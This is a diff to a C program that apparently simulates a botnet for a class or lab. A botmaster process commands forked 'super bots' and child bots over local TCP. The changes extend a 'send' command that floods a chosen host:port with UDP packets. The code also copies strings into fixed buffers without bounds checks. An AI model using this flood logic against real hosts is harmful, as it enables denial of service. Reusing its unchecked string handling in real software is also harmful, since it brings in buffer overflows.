@@ -9,18 +9,22 @@
 #include <netinet/in.h>
 #include <netdb.h>
 #include <fcntl.h>
-
+#include <signal.h>
 
 #define MASTER_PORT 2000
+
+
 
 void child_bot(int id) {
     int super_fd, file_fd, victim_fd;
     struct sockaddr_in super, victim;
-    int i, nparam;
+    int i, nparam, len;
     char msg[256];
-    char filename[100];
+    char idstr[10];
+    char host[200], port[10];
+    char filename[250];
     char attack_payload[] = "You are under attack. Zombies under control of botnet are sending you bunch of packets.";
-    char *param, *host, *port;
+    char *param, *tmp;
     if((super_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
         printf("Failed to open socket on child bot\n");
         exit(-1);
@@ -57,19 +61,22 @@ void child_bot(int id) {
         }
         else if(!strncmp(param, "create", 6)) {
             param = strtok(NULL, " ");
-            sprintf(filename, "%s_%d", param, id);
+            strcpy(filename, param);
+            strcat(filename, "_");
+            sprintf(idstr,"%d",id);
+            strcat(filename, idstr);
             file_fd = open(filename, O_WRONLY | O_CREAT);
             close(file_fd);
             write(super_fd, filename, 255);
         }
         else if(!strncmp(param, "send", 4)) {
             param = strtok(NULL, " ");
-            host = param;
+            tmp = strchr(param, ':');
+            strncpy(host, param, tmp - param);
+            strncpy(port, tmp+1, strlen(param) - strlen(host) - 1);
+            port[strlen(param) - strlen(host) -1] = 0;
             param = strtok(NULL, " ");
             nparam = atoi(param);
-            port = strchr(param+1, ':');
-            *port = '\0';
-            port = port + 1;
             if((victim_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
                 printf("Socket for sending packet command failed\n");
                 write(super_fd, "fail", 255);
@@ -82,7 +89,16 @@ void child_bot(int id) {
             for(i=0; i<nparam; i++) {
                 sendto(victim_fd, attack_payload, strlen(attack_payload), 0, (struct sockaddr*) &victim, sizeof(victim));
             }
-            write(super_fd, "send", 255);
+            len = sprintf(msg, "[%d] send %d packets to %s:%s", id, nparam, host, port);
+            //printf("%s\n",msg);
+	    msg[len] = 0;
+            write(super_fd, msg, 255);
+            close(victim_fd);
+        }
+        else if(!strncmp(param, "quit", 4)) {
+            printf("Child Bot %d quit\n", id);
+            close(super_fd);
+            return;
         }
         else {
             write(super_fd, "fail", 255);
@@ -93,7 +109,7 @@ void child_bot(int id) {
 void super_bot(int id) {
     int i, alive, nparam;
     int master_fd, listen_fd, child_fd[8], connect_len;
-    char msg[256], filename[100];
+    char msg[256], filename[100], stat[100], buf[20];
     char *param;
     struct sockaddr_in master, child;
     if((master_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
@@ -124,7 +140,7 @@ void super_bot(int id) {
     for(i=1; i<=8; i++) {
         if(fork()) {
             child_bot((id-1001) * 8 + i);
-            break;
+            return;
         }
     }
     connect_len = sizeof(child);
@@ -147,17 +163,26 @@ void super_bot(int id) {
         read(master_fd, msg, 255);
         param = strtok(msg, " ");
         if(!strncmp(param, "show", 4)) {
+            strcpy(stat, "");
             for(i=0; i<8; i++) {
                 write(child_fd[i], "show", 255);
-                read(child_fd[i], msg, 255);
+                if(read(child_fd[i], msg, 255) > 0) {
+                    sprintf(buf, "%d ", (id-1001)*8 + i + 1);
+                    strcat(stat, buf);
+                }
             }
+            write(master_fd, stat, 255);
         }
         else if(!strncmp(param, "search", 6)) {
             param = strtok(NULL, " ");
             nparam = atoi(param);
             write(child_fd[(nparam-1) % 8], "search", 255);
-            read(child_fd[(nparam-1) % 8], msg, 255);
-            write(master_fd, param, 255);
+            if(read(child_fd[(nparam-1) % 8], msg, 255) > 0) {
+                write(master_fd, "alive", 255);
+            }
+            else {
+                write(master_fd, "dead", 255);
+            }
         }
         else if(!strncmp(param, "date", 4)) {
             param = strtok(NULL, " ");
@@ -177,14 +202,36 @@ void super_bot(int id) {
             param = strtok(NULL, " ");
             nparam = atoi(param);
             param = strtok(NULL, " ");
-            strcpy(msg, "create ");
-            strcat(msg, param);
+	    sprintf(msg, "%s %s", "create", param);
             write(child_fd[(nparam-1) % 8], msg, 255);
             read(child_fd[(nparam-1) % 8], filename, 255);
-            sprintf(msg, "[%d] %s is created\n", nparam, filename);
+            sprintf(msg, "[%d] %s is created", nparam, filename);
             write(master_fd, msg, 255);
         }
         else if(!strncmp(param, "send", 4)) {
+            param = strtok(NULL, " ");
+            nparam = atoi(param);
+            strcpy(msg, "send ");
+            param = strtok(NULL, " ");
+            strcat(msg, param);
+            param = strtok(NULL, " ");
+            strcat(msg, " ");
+            strcat(msg, param);
+            write(child_fd[(nparam-1) % 8], msg, 255);
+            read(child_fd[(nparam-1) % 8], stat, 255);
+            write(master_fd, stat, 255);
+        }
+        else if(!strncmp(param, "quit", 4)) {
+            for(i=0; i<8; i++) {
+                write(child_fd[i], "quit", 255);
+            }
+            for(i=0; i<8; i++) {
+                close(child_fd[i]);
+            }
+            printf("Super Bot %d quit\n", id);
+            close(listen_fd);
+            close(master_fd);
+            return;
         }
         else {
             write(master_fd, "I don't know", 255);
@@ -203,11 +250,12 @@ void usage() {
 
 int main() {
     int i, err;
-    char cmd[100], msg[256];
-    char *param, *filename, *ipport;
+    char cmd[100], msg[256], show[100];
+    char *param, *ipport, *count, filename[100];
     int nparam;
     int listen_fd, connect_fd[4], connect_len;
     struct sockaddr_in master, super;    
+    struct sigaction sa;
     int super_id, child_num;
 
     printf("booting botnet...\n");
@@ -228,7 +276,7 @@ int main() {
     for(i=1; i<=4; i++) {
         if(fork()) {
             super_bot(1000+i);
-            break;
+            return;
         }
     }
     connect_len = sizeof(super);
@@ -259,6 +307,16 @@ int main() {
         if(!strncmp(param, "show", 4)) {
             for(i=0; i<4; i++) {
                 write(connect_fd[i], "show", 255);
+                if(read(connect_fd[i], msg, 255)>0) {
+                    param = strtok(msg, " ");
+                    sprintf(show, "%d:[%s", 1001+i, param);
+                    while((param = strtok(NULL, " ")) != NULL) {
+                        strcat(show, ",");
+                        strcat(show, param);
+                    }
+                    strcat(show, "]");
+                    printf("%s\n", show);
+                }
             }
         }
         else if(!strncmp(param, "search", 6)) {
@@ -273,8 +331,9 @@ int main() {
                 strcpy(msg, "search ");
                 strcat(msg, param);
                 write(connect_fd[nparam/8], msg, 255);
-                read(connect_fd[nparam/8], msg, 255);
-                printf("[%d:%d] alive\n", 1001+nparam/8, nparam);
+                if(read(connect_fd[nparam/8], msg, 255) > 0) {
+                    printf("[%d:%d] %s\n", 1001+(nparam-1)/8, nparam, msg);
+                }
             }
             if(err) {
                 printf("No argument given OR Wrong argument given\n");
@@ -329,7 +388,8 @@ int main() {
             }
         }
         else if(!strncmp(param, "create", 6)) {
-            filename = strtok(NULL, " ");
+            strcpy(filename, strtok(NULL, " "));
+	    printf("%s\n", filename);
             err = 1;
             while((param = strtok(NULL, " ")) != NULL) {
                 err = 0;
@@ -351,6 +411,7 @@ int main() {
             }
         }
         else if(!strncmp(param, "send", 4)) {
+            count = strtok(NULL, " ");
             ipport = strtok(NULL, " ");
             err = 1;
             while((param = strtok(NULL, " ")) != NULL) {
@@ -364,13 +425,26 @@ int main() {
                 strcat(msg, param);
                 strcat(msg, " ");
                 strcat(msg, ipport);
+                strcat(msg, " ");
+                strcat(msg, count);
                 write(connect_fd[nparam/8], msg, 255);
                 read(connect_fd[nparam/8], msg, 255);
-                printf("[%d] %s_%d is created\n", nparam, filename, nparam);
+                printf("%s\n", msg);
             }
             if(err) {
                 printf("No argument given OR Wrong argument given\n");
             }
+        }
+        else if(!strncmp(param, "quit", 4)) {
+            for(i=0; i<4; i++) {
+                write(connect_fd[i], "quit", 255);
+            }
+            for(i=0; i<4; i++) {
+                close(connect_fd[i]);
+            }
+            printf("Botmaster quit\n");
+            close(listen_fd);
+            return 0;
         }
         else {
             printf("Undefined command\n");
